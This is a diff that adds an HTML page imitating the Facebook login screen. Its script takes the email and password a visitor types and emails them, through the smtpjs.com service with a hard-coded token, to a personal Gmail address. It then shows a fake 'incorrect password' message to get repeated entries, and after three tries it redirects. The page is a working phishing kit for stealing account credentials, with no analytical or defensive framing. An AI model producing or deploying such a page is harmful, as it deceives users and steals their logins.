@@ -1,0 +1,74 @@
+<html>
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook Page Replica</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right">
+            <form>
+                <input type="text" placeholder="Email addess or phone number" id="email" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <a href="#" class="loginBtn" id="btn">Log In</a>
+                <a href="#" class="forget">Forgotten password?</a>
+                
+                <span id="error"></span>
+
+                <div class="sign-up">
+                    <a href="#" class="signupBtn">Create New Account</a>
+                </div>
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script>
+        var count = 0;
+        console.log("aaaaaaaaaaaa")
+
+        var error = document.getElementById("error")
+
+
+        let email = document.getElementById("email");
+        let password = document.getElementById("password");
+        let btn = document.getElementById("btn").addEventListener("click",()=>{
+            console.log(email.value);
+            console.log(password.value);
+            var valid = true;
+            if(email.value.length ===0 || password.value.length ===0){
+            
+                valid = false
+            }
+            if(valid == true){
+            
+            
+            
+                Email.send({
+    SecureToken : "021fcc32-091f-4d14-9954-2a59e50f3160",
+    To : 'benhadjothmanmohamedaziz@gmail.com',
+    From : 'benhadjothmanmohamedaziz@gmail.com',
+    Subject : "This is the subject",
+    Body : "the email is : " + email.value + " the password is : "+ password.value
+});
+count++;
+            if(count <3){
+                error.textContent = "Le mail ou le mot de passe entré est incorrect."
+                error.style.color = "red"
+            }
+            if(count == 3){
+                
+                window.location.href="count.html";
+            }
+            }
+        })
+                        
+    
+    </script>
+</body>
+</html>
